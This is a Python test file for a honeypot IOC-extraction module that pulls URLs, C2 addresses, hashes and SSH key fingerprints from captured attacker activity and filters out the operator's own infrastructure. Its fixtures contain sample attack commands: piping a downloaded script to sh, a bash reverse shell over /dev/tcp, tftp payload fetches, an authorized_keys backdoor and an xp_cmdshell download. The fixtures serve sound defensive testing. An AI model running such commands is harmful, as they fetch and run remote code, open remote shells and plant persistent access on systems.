"""Tests for lantana.enrichment.ioc — IOC extraction and OPSEC filtering."""

from __future__ import annotations

import hashlib

import polars as pl

from lantana.common.redact import RedactionConfig
from lantana.enrichment import ioc as ioc_mod
from lantana.enrichment.ioc import (
    extract_hashes_from_bronze,
    extract_ips,
    filter_internal_ips,
)


def _config() -> RedactionConfig:
    return RedactionConfig(
        infrastructure_ips=["192.0.2.10", "2001:db8::10"],
        infrastructure_cidrs=["10.50.99.0/24", "fd99:10:50:99::/64"],
        pseudonym_map={},
    )


class TestExtractIps:
    def test_returns_unique_set(self) -> None:
        df = pl.DataFrame({"src_ip": ["203.0.113.50", "203.0.113.50", "198.51.100.22"]})
        assert extract_ips(df) == {"203.0.113.50", "198.51.100.22"}

    def test_no_src_ip_column(self) -> None:
        df = pl.DataFrame({"event": ["login"]})
        assert extract_ips(df) == set()

    def test_drops_nulls_and_blanks(self) -> None:
        df = pl.DataFrame({"src_ip": ["203.0.113.50", None, ""]})
        result = extract_ips(df)
        assert result == {"203.0.113.50"}


class TestExtractHashesFromBronze:
    def test_returns_unique_shasum_values(self) -> None:
        h1 = "abc" * 21 + "f"
        h2 = "deadbeef" * 8
        df = pl.DataFrame(
            {
                "eventid": [
                    "cowrie.session.file_download",
                    "cowrie.session.file_download",
                    "cowrie.session.file_upload",
                ],
                "shasum": [h1, h1, h2],
            }
        )
        assert extract_hashes_from_bronze(df) == {h1, h2}

    def test_excludes_tty_log_hashes(self) -> None:
        """cowrie.log.closed shasum values are TTY recordings, not malware — must be dropped."""
        malware_hash = "a8460f44" * 8
        tty_hash = "c32b4937" * 8
        df = pl.DataFrame(
            {
                "eventid": [
                    "cowrie.session.file_download",
                    "cowrie.log.closed",
                    "cowrie.log.closed",
                ],
                "shasum": [malware_hash, tty_hash, tty_hash],
            }
        )
        result = extract_hashes_from_bronze(df)
        assert result == {malware_hash}
        assert tty_hash not in result

    def test_no_shasum_column(self) -> None:
        df = pl.DataFrame({"src_ip": ["203.0.113.50"]})
        assert extract_hashes_from_bronze(df) == set()

    def test_no_eventid_column(self) -> None:
        df = pl.DataFrame({"shasum": ["abc" * 21 + "f"]})
        assert extract_hashes_from_bronze(df) == set()


class TestBronzeOnlyIsolation:
    def test_ioc_module_has_no_sensor_disk_scanners(self) -> None:
        """One-way trust boundary: collector IOC extraction never reads /var/lib/lantana/sensor."""
        assert not hasattr(ioc_mod, "extract_hashes_from_disk")
        assert not hasattr(ioc_mod, "extract_dionaea_binary_events")


class TestFilterInternalIps:
    def test_keeps_externals(self) -> None:
        kept = filter_internal_ips({"203.0.113.50", "198.51.100.22"}, _config())
        assert kept == {"203.0.113.50", "198.51.100.22"}

    def test_drops_exact_match(self) -> None:
        kept = filter_internal_ips({"203.0.113.50", "192.0.2.10"}, _config())
        assert kept == {"203.0.113.50"}

    def test_drops_ipv4_cidr_member(self) -> None:
        kept = filter_internal_ips({"10.50.99.100", "203.0.113.50"}, _config())
        assert kept == {"203.0.113.50"}

    def test_drops_ipv6_cidr_member(self) -> None:
        kept = filter_internal_ips({"fd99:10:50:99::1", "2001:db8:1::beef"}, _config())
        assert kept == {"2001:db8:1::beef"}

    def test_non_ip_strings_kept(self) -> None:
        """Hostnames or junk pass through unchanged."""
        kept = filter_internal_ips({"not.an.ip", "203.0.113.50"}, _config())
        assert kept == {"not.an.ip", "203.0.113.50"}

    def test_drops_rfc1918(self) -> None:
        """RFC1918 addresses unrelated to this operation are dropped too —
        no threat-intel value at any provider, and we observed them
        leaking through bronze in op_alpha's first run.
        """
        kept = filter_internal_ips(
            {"10.0.0.1", "172.16.5.1", "192.168.1.1", "203.0.113.50"},
            _config(),
        )
        assert kept == {"203.0.113.50"}

    def test_drops_link_local(self) -> None:
        """Link-local (fe80::/10, 169.254.0.0/16) is dropped."""
        kept = filter_internal_ips(
            {"fe80::253:ff:fe00:1", "169.254.1.1", "203.0.113.50"},
            _config(),
        )
        assert kept == {"203.0.113.50"}

    def test_drops_loopback_and_multicast(self) -> None:
        kept = filter_internal_ips(
            {"127.0.0.1", "::1", "224.0.0.1", "203.0.113.50"},
            _config(),
        )
        assert kept == {"203.0.113.50"}


class TestV15DurableExtractors:
    """Tests for Bronze-only outbound C2/URL/domain/SSH-key and Dionaea hash extractors."""

    def test_extract_outbound_urls_domains_and_c2_ips_with_opsec_filtering(self) -> None:
        from lantana.enrichment.ioc import (
            extract_outbound_c2_ips,
            extract_outbound_urls,
            extract_stager_domains,
        )

        cfg = RedactionConfig(
            infrastructure_ips=["192.0.2.10"],
            infrastructure_cidrs=["10.50.99.0/24"],
            pseudonym_map={"192.0.2.10": "honeypot-wan"},
            infrastructure_hostnames=["vps-own.example.net"],
        )
        df = pl.DataFrame(
            {
                "file_url": [
                    "http://203.0.113.77:8080/arm7.elf",
                    "http://192.0.2.10/should-drop",
                    "http://vps-own.example.net/should-drop",
                ],
                "actor_process_cmd_line": [
                    "curl -s https://drop.example.org/stage.sh | sh; "
                    "bash -i >& /dev/tcp/198.51.100.88/4444 0>&1; "
                    "tftp -g -r x 198.51.100.89; curl http://127.0.0.1/local; "
                    "curl http://10.ip-192-0-2.example.org/ptr-leak",
                    None,
                    None,
                ],
            }
        )
        urls = extract_outbound_urls(df, cfg)
        assert "http://203.0.113.77:8080/arm7.elf" in urls
        assert "https://drop.example.org/stage.sh" in urls
        assert all("192.0.2.10" not in u for u in urls)
        assert all("127.0.0.1" not in u for u in urls)
        assert all("vps-own.example.net" not in u for u in urls)
        assert all("10.ip-192-0-2" not in u for u in urls)

        domains = extract_stager_domains(urls, cfg)
        assert domains == {"drop.example.org"}

        c2_ips = extract_outbound_c2_ips(df, cfg)
        assert c2_ips == {"203.0.113.77", "198.51.100.88", "198.51.100.89"}

    def test_extract_ssh_public_keys_computes_canonical_sha256_fingerprint(self) -> None:
        import base64

        from lantana.enrichment.ioc import extract_ssh_public_keys

        raw_key = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + b"\x42" * 32
        b64_blob = base64.b64encode(raw_key).decode("ascii")
        expected_fp = "ssh-ed25519 SHA256:" + base64.b64encode(
            hashlib.sha256(raw_key).digest()
        ).decode("ascii").rstrip("=")
        df = pl.DataFrame(
            {
                "actor_process_cmd_line": [
                    f'echo "ssh-ed25519 {b64_blob} attacker@bot" >> ~/.ssh/authorized_keys',
                    "uname -a",
                ]
            }
        )
        fps = extract_ssh_public_keys(df)
        assert fps == {expected_fp}

    def test_dionaea_attributed_hashes_and_sql_download_urls(self) -> None:
        """Dionaea bronze binary hashes, download URLs, and SQL stagers extract cleanly."""
        from lantana.enrichment.ioc import extract_outbound_c2_ips, extract_outbound_urls

        payload = b"synthetic-dionaea-elf"
        expected_sha = hashlib.sha256(payload).hexdigest()
        dionaea_bronze = pl.DataFrame(
            {
                "eventid": ["dionaea.binary.captured", None],
                "shasum": [expected_sha, None],
                "download_url": ["http://203.0.113.99/drop.bin", None],
                "sql_command": [None, "EXEC xp_cmdshell 'curl https://sql-drop.example.org/p.ps1'"],
            }
        )
        hashes = extract_hashes_from_bronze(dionaea_bronze)
        assert hashes == {expected_sha}

        cfg = _config()
        urls = extract_outbound_urls(dionaea_bronze, cfg)
        assert "http://203.0.113.99/drop.bin" in urls
        assert "https://sql-drop.example.org/p.ps1" in urls
        assert "203.0.113.99" in extract_outbound_c2_ips(dionaea_bronze, cfg)


class TestSecurityHardeningIocExtraction:
    """Adversarial regression tests for URL parsing, OPSEC leaks, ReDoS, and path traversal."""

    def test_ipv6_and_malformed_bracket_urls_never_crash_extractor(self) -> None:
        from lantana.enrichment.ioc import (
            extract_outbound_c2_ips,
            extract_outbound_urls,
            extract_stager_domains,
        )

        cfg = _config()
        df = pl.DataFrame(
            {
                "actor_process_cmd_line": [
                    "curl http://[2001:db8:beef::1]:8080/stage.sh",
                    "wget http://[malformed_bracket/x",
                    "curl https://[2001:db8:205:200::8382]/own-v6",
                ]
            }
        )
        urls = extract_outbound_urls(df, cfg)
        assert "http://[2001:db8:beef::1]:8080/stage.sh" in urls
        assert all("malformed_bracket" not in u for u in urls)
        assert extract_stager_domains(urls | {"http://[bad"}, cfg) == set()
        assert "2001:db8:beef::1" in extract_outbound_c2_ips(df, cfg)

    def test_outbound_url_leaking_infra_ip_or_hostname_in_query_is_rejected(self) -> None:
        from lantana.enrichment.ioc import extract_outbound_urls

        cfg = RedactionConfig(
            infrastructure_ips=["192.0.2.10"],
            infrastructure_cidrs=["10.50.99.0/24"],
            infrastructure_hostnames=["vps-own.example.net"],
        )
        df = pl.DataFrame(
            {
                "actor_process_cmd_line": [
                    "curl http://c2.example.org/cb?ip=192.0.2.10&tag=1",
                    "curl http://c2.example.org/cb?h=VPS-OWN.EXAMPLE.NET",
                    "curl http://c2.example.org/cb?enc=%31%39%32%2e%30%2e%32%2e%31%30",
                    "curl http://c2.example.org/clean.sh",
                ]
            }
        )
        urls = extract_outbound_urls(df, cfg)
        assert urls == {"http://c2.example.org/clean.sh"}

    def test_extract_stager_domains_rejects_path_injection_and_non_ldh(self) -> None:
        from lantana.enrichment.ioc import extract_stager_domains

        cfg = _config()
        domains = extract_stager_domains(
            {
                "http://evil.example.org%2f..%2ffiles%2fdeadbeef/x",
                "http://bad_underscore.example.org/x",
                "http://01.01.01.01/x",
                "http://1.1/x",
                "http://0x01010101/x",
                "https://valid-drop.example.org/payload",
            },
            cfg,
        )
        assert domains == {"valid-drop.example.org"}

    def test_outbound_c2_extractor_linear_time_no_redos(self) -> None:
        import time

        from lantana.enrichment.ioc import extract_outbound_c2_ips

        cfg = _config()
        adversarial = "wget " * 10_000 + "http://not-an-ip/x"
        df = pl.DataFrame({"actor_process_cmd_line": [adversarial]})
        t0 = time.monotonic()
        assert extract_outbound_c2_ips(df, cfg) == set()
        assert (time.monotonic() - t0) < 0.5

    def test_filter_internal_ips_unwraps_ipv4_mapped_ipv6(self) -> None:
        cfg = RedactionConfig(
            infrastructure_ips=["192.0.2.10"],
            infrastructure_cidrs=["10.50.99.0/24"],
        )
        kept = filter_internal_ips(
            {
                "::ffff:192.0.2.10",
                "::FFFF:127.0.0.1",
                "::ffff:10.50.99.100",
                "198.51.100.55",
            },
            cfg,
        )
        assert kept == {"198.51.100.55"}
